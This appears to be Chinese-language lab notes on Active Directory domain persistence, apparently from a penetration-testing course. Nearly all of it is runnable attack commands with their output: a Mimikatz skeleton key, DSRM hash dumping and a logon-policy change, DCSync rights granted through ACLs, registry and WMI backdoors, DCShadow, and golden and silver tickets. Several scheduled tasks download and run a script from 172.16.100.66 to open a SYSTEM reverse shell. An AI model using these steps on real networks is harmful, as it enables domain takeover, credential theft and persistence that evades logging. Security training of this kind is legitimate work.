# 制作万能钥匙
在一台有DA权限的shell里运行下面命令

所有计算机都可以使用密码：```mimikatz```访问

### 方法1
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
### 方法2(推荐)
回到学生机器,创建一个DC的登录session
```
$sess = New-PSSession dcorp-dc.dollarcorp.moneycorp.local
```

把mimikatz加载到指定session
```
 Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

再次进入DC
```
 Enter-PSSession -Session $sess
```

执行mimikatz，制作万能钥匙
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```

开一个学生shell使用下面命令以student370的身份进入主机
```Enter-PSSession –Computername dcorp-std370 –credential dcorp\student370```

# DSRM利用
目录服务还原模式。除了krbtgt服务帐号外，域控上还有个可利用的账户：目录服务还原模式（DSRM）账户，这个密码是在DC安装的时候设置的，所以一般不会被修改

用有DA权限的shell，运行下面命令，dump出DSRM的哈希密码

```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc

SAMKey : 33e0913ef3886d77d5873060bcea1cfb

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd
```
这里会出现Administrator的哈希(也就是DSRM的密码)：```a102ad5753f4c441e3af31c97fad86fd```

再用下面命令dump出现在Administrator的密码，与上面DSRM的密码进行比较

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760
```
新的密码是：```af0686cc0ca8f04df42210c9ac980760```

DSRM administrator不允许登陆，用之前的session进入DC修改

要先bypass ASMI

再运行下面命令，修改DSRM的远程登录策略
```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```


现在用DSRM的原始哈希，来运行一个有DA权限的shell,注意，这里的/domain参数指定的是dcorp-dc这台计算机，不是域的名字
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

验证:
```
PS C:\ad> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-dc.dollarcorp.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   1:32 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---       12/14/2019   8:23 PM                Users
d-----        8/20/2020   2:05 AM                Windows
```

可以访问文件系统，但是不能在这台系统上执行命令。

如果想要用DSRM获得一个shell，可以设置一个定时任务


## 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

## 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```


获得反弹shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 64272
Windows PowerShell running as user DCORP-DC$ on DCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> hostname
dcorp-dc
```

#  Dcsync 

using ACLs – Rights Abuse

查找账号student366是否有DCSync的权限（此操作需要DA权限）
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```
如果没有任何返回，表示没有权限

来到有DA权限的shell，注意这里要enter-pssession到DC服务器

添加完全控制权限
```
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student366 -Rights All -Verbose
```
再把Dcsync权限赋予当前学生账号student366
```
Add-ObjectAcl -TargetDistinguishedName"dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student366 -Rights DCSync -Verbose
```

再次查看本账号是否有Dcsync权限

```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

如果已经出现```ActiveDirectoryRights : GenericAll```表示成功赋权

执行Dcsync,导出krbtgt哈希（也可以是其他用户,此操作需要在DA权限的shell里操作）
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

# Security Descriptors（安全描述符）

在DA权限shell引入RACE.ps1框架
```
PS C:\ad> . .\RACE.ps1
```

为WMI修改安全描述符，允许student366进入WMI
```
Set-RemoteWMI -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
```

在学生shell（重启VM生效）查看
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### 没有登录凭证，修改安全描述符，使得学生机可以在DC上执行命令

DA shell，引入RACE.ps1，域名写全(注意：这里如果不能正常设置，enter-psssesion到DC，bypass AMSI，远程加载RACE.ps1后在DC上设置)
```
PS C:\ad> . .\RACE.ps1
PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

在学生shell，执行whoami命令
```
Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### 无管理员密码的情况下从目标机器上dump出哈希

Modifying DC registry security descriptors for remote hash retrieval using DAMP

在DC上修改权限，允许本账号（student366）远程dump出哈希，在DAshell
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student366 -Verbose
```

在学生shell
引入框架
```
PS C:\ad> . .\RACE.ps1
```

dump出dcorp-dc这台机器的哈希
```
PS C:\ad> Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
VERBOSE: Bootkey/SysKey : 85462B93FC25EE67BB07AD899096199B
VERBOSE: LSA Key        : FD3251451B1293B9ED7AF4BED8E19A678F514B9BC2B42B796E2C72AF156945E9

ComputerName                        MachineAccountHash
------------                        ------------------
dcorp-dc.dollarcorp.moneycorp.local 126289c16302fb23b71ec09f0d3d5391
```

现在我们有了这台机器的哈希，可以用来制作银票

基于HOST服务的银票
```
. .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

基于RPCSS服务的银票
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

可以建一个定时任务反弹DC这台服务器的shell

# DCShadow

DCShadow 是一种通过临时模仿域控制器来掩盖某些操作的攻击。如果您在根域中具有域管理员或企业管理员权限，则可以将其用于林级持久性。

或者，作为域管理员，为选定的用户提供 DCShadow 攻击所需的权限（使用Set-DCShadowPermissions.ps1cmdlet）。

```
Set-DCShadowPermissions -FakeDC BackdoorMachine -SamAccountName TargetUser -Username BackdoorUser -Verbose
```

然后，在任何机器上，使用 Mimikatz 进行 DCShadow 攻击。

```
# Set SPN for user
lsadump::dcshadow /object:TargetUser /attribute:servicePrincipalName /value:"SuperHacker/ServicePrincipalThingey"

# Set SID History for user (effectively granting them Enterprise Admin rights)
lsadump::dcshadow /object:TargetUser /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519

# Set Full Control permissions on AdminSDHolder container for user
## Requires retrieval of current ACL:
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com")).psbase.ObjectSecurity.sddl

## Then get target user SID:
Get-NetUser -UserName BackdoorUser | select objectsid

## Finally, add full control primitive (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for user
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;[[S-1-5-21-1874506631-3219952063-538504511-45109]])
```

最后，从 DA 会话或之前提供 DCShadow 权限的用户的会话中，运行 DCShadow 攻击。前面的那些操作将不会记录到日志。

```
lsadump::dcshadow /push
```


# 制作金票
需要krbtgt和它的NTML哈希
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

验证金票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```


新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己

## 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

## 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```



# 制作银票
金票和银票的分别
> 1.金票伪造的TGT(Ticket GrantingTicket)，所以可以获取任何Kerberos服务权限
> 2.银票是伪造的TGS的TS，只能访问指定的服务权限
> 3.GoldenTicket是由krbtgt的hash加密
> 4.Silver Ticket是由服务账户（通常为计算机账户）hash加密
> 5.GoldenTicket在使用的过程需要同域控通信
> 6.Silver Ticket在使用的过程不需要同域控通信

如果知道一台计算机的哈希，比如DCORP-DC$
```
RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 126289c16302fb23b71ec09f0d3d5391
```
可以用来制作银票

普通权限shell下执行命令
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

执行完上面命令，在当前shell会有一个Administrator的session

新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己

# 使用定时任务执行命令

## 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

## 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```
